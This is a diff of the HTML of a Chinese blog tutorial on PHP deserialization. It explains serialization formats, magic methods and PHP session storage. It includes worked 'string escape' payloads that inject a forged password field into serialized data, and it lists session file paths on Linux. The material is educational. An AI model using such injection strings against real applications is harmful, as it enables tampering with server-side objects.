nav-level-3"><a class="nav-link" href="#destruct-%E6%9E%90%E6%9E%84%E6%96%B9%E6%B3%95"><span class="nav-number">3.4.</span> <span class="nav-text">__destruct()析构方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#toString-%E6%96%B9%E6%B3%95"><span class="nav-number">3.5.</span> <span class="nav-text">__toString()方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sleep-%E6%96%B9%E6%B3%95"><span class="nav-number">3.6.</span> <span class="nav-text">__sleep()方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call-%E6%96%B9%E6%B3%95"><span class="nav-number">3.7.</span> <span class="nav-text">__call()方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#callStatic-%E6%96%B9%E6%B3%95"><span class="nav-number">3.8.</span> <span class="nav-text">__callStatic()方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-%E6%96%B9%E6%B3%95"><span class="nav-number">3.9.</span> <span class="nav-text">__get()方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#set-%E6%96%B9%E6%B3%95"><span class="nav-number">3.10.</span> <span class="nav-text">__set()方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#isset-%E6%96%B9%E6%B3%95"><span class="nav-number">3.11.</span> <span class="nav-text">__isset()方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#isset-%E5%87%BD%E6%95%B0"><span class="nav-number">3.11.1.</span> <span class="nav-text">isset()函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unset-%E6%96%B9%E6%B3%95"><span class="nav-number">3.12.</span> <span class="nav-text">__unset()方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#invoke-%E6%96%B9%E6%B3%95"><span class="nav-number">3.13.</span> <span class="nav-text">__invoke()方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wakeup-%E6%96%B9%E6%B3%95"><span class="nav-number">3.14.</span> <span class="nav-text">__wakeup()方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="nav-number">4.</span> <span class="nav-text">反序列化攻击原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A7%BF%E5%8A%BF%E4%B8%80%EF%BC%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="nav-number">5.</span> <span class="nav-text">姿势一：字符串逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%87%A0%E5%A4%A7%E7%89%B9%E6%80%A7"><span class="nav-number">5.0.1.</span> <span class="nav-text">php反序列化的几大特性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="nav-number">5.0.2.</span> <span class="nav-text">反序列化字符逃逸</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%A2%9E%E5%A4%9A"><span class="nav-number">5.0.3.</span> <span class="nav-text">字符增多</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%87%8F%E5%B0%91"><span class="nav-number">5.0.4.</span> <span class="nav-text">字符减少</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.0.5.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A7%BF%E5%8A%BF%E4%BA%8C%EF%BC%9Asession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">6.</span> <span class="nav-text">姿势二：session反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFsession"><span class="nav-number">6.0.1.</span> <span class="nav-text">什么是session</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP-session%E6%9C%BA%E5%88%B6"><span class="nav-number">6.0.2.</span> <span class="nav-text">PHP session机制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#session%E7%9A%84%E4%BA%A7%E7%94%9F%E5%92%8C%E5%AD%98%E5%82%A8"><span class="nav-number">6.0.3.</span> <span class="nav-text">session的产生和存储</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#session%E5%9C%A8php-ini%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="nav-number">6.0.4.</span> <span class="nav-text">session在php.ini的配置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">6.0.5.</span> <span class="nav-text">反序列化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#session-start-%E5%87%BD%E6%95%B0"><span class="nav-number">6.0.6.</span> <span class="nav-text">session_start()函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="nav-number">6.0.7.</span> <span class="nav-text">攻击原理</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E4%BA%8EPHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">7.</span> <span class="nav-text">关于PHP原生类的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">7.1.</span> <span class="nav-text">读取文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95"><span class="nav-number">7.2.</span> <span class="nav-text">遍历文件目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87md5-hash"><span class="nav-number">7.3.</span> <span class="nav-text">绕过md5&#x2F;hash</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">wanTh3flag</p>
+  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">160</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">117</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="wanTh3flag">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="root@wanth3f1ag">
+      <meta itemprop="description" content="一条有梦想的咸鱼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="PHP反序列化 | root@wanth3f1ag">
+      <meta itemprop="description" content="PHP反序列化">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PHP反序列化
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-08-12 12:28:19" itemprop="dateCreated datePublished" datetime="2025-08-12T12:28:19+08:00">2025-08-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-12-01 19:10:08" itemprop="dateModified" datetime="2025-12-01T19:10:08+08:00">2025-12-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="index"><span itemprop="name">PHP反序列化</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>31k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>28 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">PHP反序列化</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="PHP反序列化是什么"><a href="#PHP反序列化是什么" class="headerlink" title="PHP反序列化是什么"></a>PHP反序列化是什么</h2><p>知识点:</p>
 <h3 id="序列化（Serialization）"><a href="#序列化（Serialization）" class="headerlink" title="序列化（Serialization）"></a>序列化（Serialization）</h3><p>是将数据结构或对象转换成一种可存储或可传输格式的过程。在序列化后，数据可以被写入文件、发送到网络或存储在数据库中，以便在需要时可以再次还原成原始的数据结构或对象。序列化的过程通常涉及将数据转换成字节流或类似的格式，使其能够在不同平台和编程语言之间进行传输和交换。</p>
 <h3 id="反序列化（Deserialization）"><a href="#反序列化（Deserialization）" class="headerlink" title="反序列化（Deserialization）"></a>反序列化（Deserialization）</h3><p>是序列化的逆过程，即将序列化后的数据重新还原成原始的数据结构或对象。反序列化是从文件、网络数据或数据库中读取序列化的数据，并将其转换回原始形式，以便在程序中进行使用和操作。</p>
 <p>反序列化的过程中，unserialize()接收的值(字符串)可控<br>通过更改这个值，得到所需要的代码<br>通过调用方法，触发代码执行<br>魔术方法在特定条件下自动调用相关方法，最终导致触发代码。</p>
@@ -206,7 +350,7 @@
 <li><code>s:4:&quot;name&quot;;s:3:&quot;meng&quot;;</code>表示第一个属性为字符串，且属性名为<code>name</code>,属性值为字符串,属性内容为&#96;meng</li>
 </ul>
 <p>一般的序列化字符串的格式是</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">变量类型:类名长度:类名:属性数量:&#123;属性类型:属性名长度:属性名;属性值类型:属性值长度:属性值内容&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">变量类型:类名长度:类名:属性数量:&#123;属性类型:属性名长度:属性名;属性值类型:属性值长度:属性值内容&#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="常见的类型标志"><a href="#常见的类型标志" class="headerlink" title="常见的类型标志"></a>常见的类型标志</h3><table>
 <thead>
@@ -312,7 +456,7 @@
 
 <p>这是得到的序列化后的字符串</p>
 <p>但因为三种修饰符不一样，得出来的属性长度和属性名都发生了变化</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public:</span><br><span class="line">s:3:&quot;age&quot;;s:2:&quot;18&quot;;</span><br><span class="line">protected:</span><br><span class="line">s:6:&quot;%00*%00age&quot;;s:2:&quot;18&quot;;</span><br><span class="line">private:</span><br><span class="line">s:13:&quot;%00Me%00languages&quot;;s:2:&quot;CN&quot;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">public</span>:</span><br><span class="line"><span class="attribute">s</span>:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;18&quot;</span>;</span><br><span class="line"><span class="attribute">protected</span>:</span><br><span class="line"><span class="attribute">s</span>:<span class="number">6</span>:<span class="string">&quot;%00*%00age&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;18&quot;</span>;</span><br><span class="line"><span class="attribute">private</span>:</span><br><span class="line"><span class="attribute">s</span>:<span class="number">13</span>:<span class="string">&quot;%00Me%00languages&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;CN&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>总结来说就是</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>(公有) </span><br><span class="line"><span class="keyword">protected</span>(受保护)     <span class="comment">// %00*%00属性名</span></span><br><span class="line"><span class="keyword">private</span>(私有的)       <span class="comment">// %00类名%00属性名</span></span><br></pre></td></tr></table></figure>
@@ -372,10 +516,10 @@
 </tbody></table>
 <p>那我们来逐个介绍一下</p>
 <h3 id="serialize-魔术方法"><a href="#serialize-魔术方法" class="headerlink" title="__serialize()魔术方法"></a>__serialize()魔术方法</h3><p>serialize() 函数会检查类中是否存在一个魔术方法 __serialize() 。如果存在，该方法将在任何序列化之前优先执行。它必须以一个代表对象序列化形式的 键&#x2F;值 成对的关联数组形式来返回，如果没有返回数组，将会抛出一个 TypeError 错误。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果类中同时定义了 __serialize() 和 __sleep() 两个魔术方法，则只有 __serialize() 方法会被调用。 __sleep() 方法会被忽略掉。</span><br></pre></td></tr></table></figure>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果类中同时定义了 <span class="built_in">__serialize</span>() 和 <span class="built_in">__sleep</span>() 两个魔术方法，则只有 <span class="built_in">__serialize</span>() 方法会被调用。 <span class="built_in">__sleep</span>() 方法会被忽略掉。</span><br></pre></td></tr></table></figure>
 
 <h3 id="unserialize魔术方法"><a href="#unserialize魔术方法" class="headerlink" title="__unserialize魔术方法"></a>__unserialize魔术方法</h3><p>unserialize() 检查是否存在具有名为 <code>__unserialize()</code>的魔术方法。此函数将会传递从 __serialize() 返回的恢复数组。然后它可以根据需要从该数组中恢复对象的属性。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。</span><br></pre></td></tr></table></figure>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果类中同时定义了 <span class="built_in">__unserialize</span>() 和 <span class="built_in">__wakeup</span>() 两个魔术方法，则只有 <span class="built_in">__unserialize</span>() 方法会生效，<span class="built_in">__wakeup</span>() 方法会被忽略。</span><br></pre></td></tr></table></figure>
 
 <p>影响版本：此特性自 PHP 7.4.0 起可用。</p>
 <h3 id="construct-构造方法"><a href="#construct-构造方法" class="headerlink" title="__construct()构造方法"></a>__construct()构造方法</h3><p>构造函数，当一个对象创建时被调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作</p>
@@ -405,7 +549,7 @@
 </ul>
 <h3 id="toString-方法"><a href="#toString-方法" class="headerlink" title="__toString()方法"></a>__toString()方法</h3><p>当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串</p>
 <p>注意：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此方法必须返回一个字符串，否则将发出一条 `E_RECOVERABLE_ERROR` 级别的致命错误。</span><br></pre></td></tr></table></figure>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此方法必须返回一个字符串，否则将发出一条 `E_RECOVERABLE_ERROR` 级别的致命错误。</span><br></pre></td></tr></table></figure>
 
 <p>警告：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不能在 <span class="title function_ invoke__">__toString</span>() 方法中抛出异常。这么做会导致致命错误。</span><br></pre></td></tr></table></figure>
@@ -526,10 +670,10 @@
 <p><code>O:4:&quot;name&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:1:&quot;b&quot;;&#125;</code></p>
 <p>那么此时我们就需要把<code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</code>给挤出来，让<code>&quot;;s:8:&quot;password&quot;;s:1:&quot;b&quot;;&#125;</code>失效，我们该如何构造字符逃逸呢？</p>
 <p>已知admin会换成hacker，多出一个字符，我们对比替换前后的字符再加上我们需要构造的序列化字符串</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;name&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;ax&quot;;s:8:&quot;password&quot;;s:1:&quot;b&quot;;&#125;//替换前</span><br><span class="line">O:4:&quot;name&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;ayy&quot;;s:8:&quot;password&quot;;s:1:&quot;b&quot;;&#125;//替换后</span><br><span class="line">O:4:&quot;name&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:1:&quot;b&quot;;&#125;//需要构造的序列化字符串</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ax&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;//替换前</span><br><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ayy&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;//替换后</span><br><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;&#125;<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:1:&quot;</span>b<span class="string">&quot;;&#125;//需要构造的序列化字符串</span></span><br></pre></td></tr></table></figure>
 
 <p>那么我们需要逃逸的字符串就是</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;//个数为31</span><br></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;&#125;//个数为<span class="number">31</span></span><br></pre></td></tr></table></figure>
 
 <p>需要逃逸31个字符，一个x可以换成2个y，多出一个字符，那我们构造31个x，这样替换后多出来的31个y就可以把我们需要逃逸的字符串挤出来</p>
 <p><img src="/../image/achieve/202411/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250321210048777.png" alt="image-20250321210048777"></p>
@@ -539,17 +683,17 @@
 <p>问：如果我能控制进行反序列化的字符串，该如何使var_dump打印出来的password对应的值是<code>123456</code>，而不是<code>biubiu</code>？</p>
 <p>正常情况下反序列化字符串**$str1**的值为 <code>O:4:&quot;name&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;password&quot;;s:1:&quot;b&quot;;&#125;</code></p>
 <p>如果我们的username的值是xx呢？</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;name&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;y&quot;;s:8:&quot;password&quot;;s:1:&quot;b&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;y&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>成功替换并且少了一个字符，那么我们该如何利用字符减少的方法去进行字符串逃逸呢？</p>
 <p>假如我们需要让password的值为123456，那么我们最终要实现的序列化字符串就是</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;name&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;y&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;y&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>那么此时我们就需要让<code>&quot;;s:8:&quot;password&quot;;s:1:&quot;b&quot;;&#125;</code>失效，我们该如何构造字符逃逸呢？</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;name&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;y&quot;;s:8:&quot;password&quot;;s:1:&quot;b&quot;;&#125;“;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;y&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;“;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>和字符增多不同的是，需要逃逸的字符是不变的，但是我们需要计算的长度是要使之失效的字符的长度</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:1:&quot;b&quot;;&#125;//26个</span><br></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;//<span class="number">26</span>个</span><br></pre></td></tr></table></figure>
 
 <p>需要替换掉26个字符，已知传入xx会替换成y，减少一个字符，那我们需要让最后的y是26个，那么就需要传入52个x</p>
 <p><img src="/../image/achieve/202411/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250321211735531.png" alt="image-20250321211735531"></p>
@@ -579,7 +723,7 @@
 <p><img src="/../image/achieve/202411/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250414124612334.png" alt="image-20250414124612334"></p>
 <p>可以看到这里随机生成了一个session_id的，而且生成的session_id会存入到cookie中</p>
 <p>然后我们看一下session会保存在哪里，之前我们就讲过，session 是会保存在服务器下的临时目录的，一般都在tmp目录下，或者我们可以在php.ini文件中进行修改</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Linux下常见的保存位置</span><br><span class="line">/var/lib/php5/sess_PHPSESSID</span><br><span class="line">/var/lib/php7/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSED</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Linux下常见的保存位置</span><br><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/php5/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/php7/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/php/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/tmp/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/tmp/</span>sessions/sess_PHPSESSED</span><br></pre></td></tr></table></figure>
 
 <p>这些是常见的保存位置，那我们接下来看一下php.ini中对session的配置</p>
 <h4 id="session在php-ini的配置"><a href="#session在php-ini的配置" class="headerlink" title="session在php.ini的配置"></a>session在php.ini的配置</h4><p>先看看php.ini中对session的配置</p>
@@ -593,7 +737,7 @@
 <p><img src="/../image/achieve/202411/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250417152511397.png" alt="image-20250417152511397"></p>
 <p>当然文件的内容始终是session的值序列化后的内容</p>
 <p>上面也提到了session的序列化引擎，下面介绍了三种引擎</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php	键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</span><br><span class="line">php_binary	键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</span><br><span class="line">php_serialize (php&gt;=5.5.4)	经过 serialize() 函数反序列处理的数组</span><br></pre></td></tr></table></figure>
